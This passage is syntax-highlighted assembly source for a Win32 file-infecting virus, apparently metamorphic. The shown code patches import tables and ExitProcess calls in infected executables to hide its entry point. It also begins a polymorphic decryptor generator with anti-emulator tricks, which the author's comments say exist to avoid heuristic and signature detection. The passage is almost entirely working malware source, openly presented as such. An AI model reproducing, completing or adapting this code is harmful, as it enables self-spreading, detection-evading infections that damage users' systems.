                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                </span><span class="sc1">; Next array entry</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@UpdateImports_Loop01</span><span class="sc0">

        </span><span class="sc5">@@UpdateImportsOK_02</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Fix the array RVA itself</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@UpdateImportsOK_03</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">AddUndoAction</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc5">@@UpdateImportsOK_03</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">      </span><span class="sc1">; Fix the RVA to the array of imported</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; functions. It holds the imported</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">      </span><span class="sc1">; addresses of the functions in run-time</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@UpdateImportsOK_04_</span><span class="sc0">  </span><span class="sc1">; (but see below for a "cool"</span><span class="sc0">
                                             </span><span class="sc1">; feature)</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">AddUndoAction</span><span class="sc0">   </span><span class="sc1">; Add the undo action for this.</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc5">@@UpdateImportsOK_04_</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc5">@@UpdateImportsOK_04</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;; Big-time duddy-dudde chili-chap Micro$oft paranoical "optimization"</span><span class="sc0">
</span><span class="sc1">;; What are that thunks at +10h in import header? Just guess!!</span><span class="sc0">
</span><span class="sc1">;; I was amazed why the infected programs worked under WinNT but NOT under</span><span class="sc0">
</span><span class="sc1">;;  win9x (just the opposite of what it happens normally). So, I supposed that</span><span class="sc0">
</span><span class="sc1">;;  the values at this thunk were always updated with the kernel exported</span><span class="sc0">
</span><span class="sc1">;;  addresses, so, just in case, it didn't matter if I updated also these</span><span class="sc0">
</span><span class="sc1">;;  addresses. FALSE!! (now imagine lots of red lights and alarms). By any</span><span class="sc0">
</span><span class="sc1">;;  dark reason, the win32 subsystem doesn't update that addresses if the</span><span class="sc0">
</span><span class="sc1">;;  executable runs under the operating system where it was compiled or</span><span class="sc0">
</span><span class="sc1">;;  was compiled for!! Windows NT updates this addresses ALWAYS, but not</span><span class="sc0">
</span><span class="sc1">;;  Win9x, which uses the hardcoded API addresses that are already at the</span><span class="sc0">
</span><span class="sc1">;;  executable (!!!!!!!!!!!!!!). So, if we don't touch this, all is fine.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; Idea: we can make EPO if we save this values and set our own ones. It will</span><span class="sc0">
</span><span class="sc1">;;  only work under Win9x, something that it's fine if we are making a ring-0</span><span class="sc0">
</span><span class="sc1">;;  virus.</span><span class="sc0">

</span><span class="sc1">;                 push    ebx</span><span class="sc0">
</span><span class="sc1">;                 mov     ebx, eax</span><span class="sc0">
</span><span class="sc1">;                 call    TranslateVirtualToPhysical</span><span class="sc0">
</span><span class="sc1">;                 or      ebx, ebx</span><span class="sc0">
</span><span class="sc1">;                 jz    @@NextRecord</span><span class="sc0">
</span><span class="sc1">;         @@LoopUpdateThunks:</span><span class="sc0">
</span><span class="sc1">;                 mov     eax, [ebx]</span><span class="sc0">
</span><span class="sc1">;                 or      eax, eax</span><span class="sc0">
</span><span class="sc1">;                 jz    @@NextRecord</span><span class="sc0">
</span><span class="sc1">;                 cmp     eax, edi</span><span class="sc0">
</span><span class="sc1">;                 jb    @@ThunkUpdated</span><span class="sc0">
</span><span class="sc1">;                 call    AddUndoAction</span><span class="sc0">
</span><span class="sc1">;                 add     eax, ecx</span><span class="sc0">
</span><span class="sc1">;                 mov     [ebx], eax</span><span class="sc0">
</span><span class="sc1">;         @@ThunkUpdated:</span><span class="sc0">
</span><span class="sc1">;                 add     ebx, 4</span><span class="sc0">
</span><span class="sc1">;                 jmp   @@LoopUpdateThunks</span><span class="sc0">
</span><span class="sc1">;         @@NextRecord:</span><span class="sc0">
</span><span class="sc1">;                 pop     ebx</span><span class="sc0">


                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc0">    </span><span class="sc1">; Get next import header</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@UpdateImports_Loop00</span><span class="sc0">

        </span><span class="sc5">@@ImportsUpdated</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">UpdateImports</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Let's patch ExitProcess with several methods. The size of the patch must</span><span class="sc0">
</span><span class="sc1">;; be less than 6 bytes.</span><span class="sc0">
</span><span class="sc1">;; An alternate way has been added, which only works for Win9x: the Import</span><span class="sc0">
</span><span class="sc1">;; table is patched but not the call, so under Win9x, if the system coincides</span><span class="sc0">
</span><span class="sc1">;; with the version expressed in the header, the call will be made. This makes</span><span class="sc0">
</span><span class="sc1">;; a virus that is dormant under WinNT but spreads on Win9x.</span><span class="sc0">
</span><span class="sc1">;; ESI = Address to patch</span><span class="sc0">
</span><span class="sc1">;; EDX = Address to point to</span><span class="sc0">
</span><span class="sc5">PatchExitProcess</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean_X004_7</span><span class="sc0">   </span><span class="sc1">; WEIGHT_X005</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@PUSHRET</span><span class="sc0">
     </span><span class="sc5">@@IndirectDisplacement</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc1">; Let's make "JMP/PUSH [Address]"</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TextHeader</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the code section address</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Get the size in ECX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MappingAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc5">@@LoopFindHole</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NotFound</span><span class="sc0">         </span><span class="sc1">; Search for a hole of the type</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; "INT 3 padded" of at least DWORD</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CCCCCCCCh</span><span class="sc0">  </span><span class="sc1">; sized</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@HoleFound</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@LoopFindHole</span><span class="sc0">
     </span><span class="sc5">@@NotFound</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">; If we didn't find anything, make the</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; other method</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@PUSHRET</span><span class="sc0">
     </span><span class="sc5">@@HoleFound</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">           </span><span class="sc1">; Put the address to jump at the hole,</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">    </span><span class="sc1">; overwriting the padding.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">     </span><span class="sc1">; Now look the way ExitProcess is made.</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C3h</span><span class="sc0">     </span><span class="sc1">; Is there a RET after it? (the compilers</span><span class="sc0">
                                      </span><span class="sc1">; put them)</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@RetInserted</span><span class="sc0">   </span><span class="sc1">; If it is, put "PUSH DWORD PTR [ExitP]"</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MappingAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TextHeader</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get the address of the hole</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HeaderAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; Overwrite the call with the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">25h</span><span class="sc0">             </span><span class="sc1">; hole address, and set "JMP"</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">; instruction.</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Return</span><span class="sc0">
     </span><span class="sc5">@@RetInserted</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">35h</span><span class="sc0">        </span><span class="sc1">; Set "PUSH DWORD PTR [ExitProcess]"</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">     </span><span class="sc1">; and use the RET before to jump.</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Return</span><span class="sc0">
     </span><span class="sc5">@@PUSHRET</span><span class="sc4">:</span><span class="sc0">                       </span><span class="sc1">; Make "PUSH Address/RET"</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">68h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C3h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

     </span><span class="sc5">@@Return</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">PatchExitProcess</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; End of the infector</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">


</span><span class="sc1">;; KEYWORD: Key_!MakePoly</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;;; ********************************************************************** ;;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; The polymorphic engine</span><span class="sc0">
</span><span class="sc1">;; ----------------------</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; This is not a polymorphic engine like I made in other viruses, since I</span><span class="sc0">
</span><span class="sc1">;; don't code by myself any machine code: I let the metamorphic engine to</span><span class="sc0">
</span><span class="sc1">;; do it, calling XpandCode and AssembleCode to build the instructions. So,</span><span class="sc0">
</span><span class="sc1">;; the decryptor is always constructed in my pseudoassembler.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; The decryptor is sometimes only a "mover": since the virus can be not</span><span class="sc0">
</span><span class="sc1">;; encrypted once in every 16 times, in fact only copies the data to the</span><span class="sc0">
</span><span class="sc1">;; reserved memory. This avoids lots of heuristic alarms.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; "Branching", as I did in TUAREG, is not made, but PRIDE is. The decryption</span><span class="sc0">
</span><span class="sc1">;; will be non-linear, with a control of buffer-overflow that allows me to</span><span class="sc0">
</span><span class="sc1">;; have a not-aligned buffer size, but still making random index accessing.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; The decryptor will allocate virtual memory at the beginning to copy the</span><span class="sc0">
</span><span class="sc1">;; virus there, calling to the imported function. If the function is not</span><span class="sc0">
</span><span class="sc1">;; imported by the host, some code will be added to import it and call it.</span><span class="sc0">
</span><span class="sc1">;; After that, We'll push the parameters needed for the virus working and we</span><span class="sc0">
</span><span class="sc1">;; will copy the virus to the allocated memory, decrypting it on the fly and</span><span class="sc0">
</span><span class="sc1">;; accessing that data with apparentlu random offsets.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; It has also the chance of making a little anti-emulator trick at the</span><span class="sc0">
</span><span class="sc1">;; beginning: once in every 4 decryptors, a RDTSC/RET like instruction will</span><span class="sc0">
</span><span class="sc1">;; be constructed on runtime, called, and a random bit from EAX checked for</span><span class="sc0">
</span><span class="sc1">;; 0 or 1, ending execution if the condition is met. This makes the virus to</span><span class="sc0">
</span><span class="sc1">;; execute randomly, and forcing a detection by signature or heuristics.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">

</span><span class="sc5">MakeDecryptor</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc1">; We need:</span><span class="sc0">
</span><span class="sc1">; The instruction table stored at [InstructionTable]</span><span class="sc0">
</span><span class="sc1">; A buffer to assemble the decryptor at [NewAssembledCode]</span><span class="sc0">
</span><span class="sc1">; The number of jump labels at [NumberOfLabels]</span><span class="sc0">
</span><span class="sc1">; A table of labels at [LabelTable], with the instruction address at +4</span><span class="sc0">
</span><span class="sc1">; The address of the last instruction at [AddressOfLastInstruction]</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InstructionTable</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">  </span><span class="sc1">; Set the pointer</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumberOfLabels</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; Initialize these vars.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumberOfVariables</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80000h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ExpansionResult</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_DataHole</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Get the virtual address</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HeaderAddress</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; of the data hole.</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">StartOfEncryptedData</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RelocHeader</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Check if we have a .reloc</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                  </span><span class="sc1">; header.</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@SetDataAtEndOfCryptedCode</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DataHeader</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; If we haven't a .reloc,</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HeaderAddress</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; we put the data buffer</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">                    </span><span class="sc1">; address at the .data</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FCh</span><span class="sc0">                 </span><span class="sc1">; section with a random</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; displacement start offset</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; to avoid fixed addresses.</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@SetDecryptorDataSection</span><span class="sc0">   </span><span class="sc1">; Since all in the app has</span><span class="sc0">
                               </span><span class="sc1">; finished (we arrived here with an ExitProcess</span><span class="sc0">
                               </span><span class="sc1">; patch) we can overwrite .data as we want.</span><span class="sc0">

      </span><span class="sc5">@@SetDataAtEndOfCryptedCode</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SizeOfNewCode</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the size of the new</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFFFCh</span><span class="sc0">           </span><span class="sc1">; assembled code and set the</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                    </span><span class="sc1">; decryptor's data frame at</span><span class="sc0">
      </span><span class="sc5">@@SetDecryptorDataSection</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">; the end of the encrypted</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Decryptor_DATA_SECTION</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; part.</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                         </span><span class="sc1">; Set this flag for the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CreatingADecryptor</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; expander.</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_MakeRandomExecution</span><span class="sc0">  </span><span class="sc1">; Create a random-execution</span><span class="sc0">
                                                  </span><span class="sc1">; snippet to fuck emulators</span><span class="sc0">
                                                  </span><span class="sc1">; a little ;)</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">VirtualAllocAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; Does the app import VirtualAlloc?</span><span class="sc0">
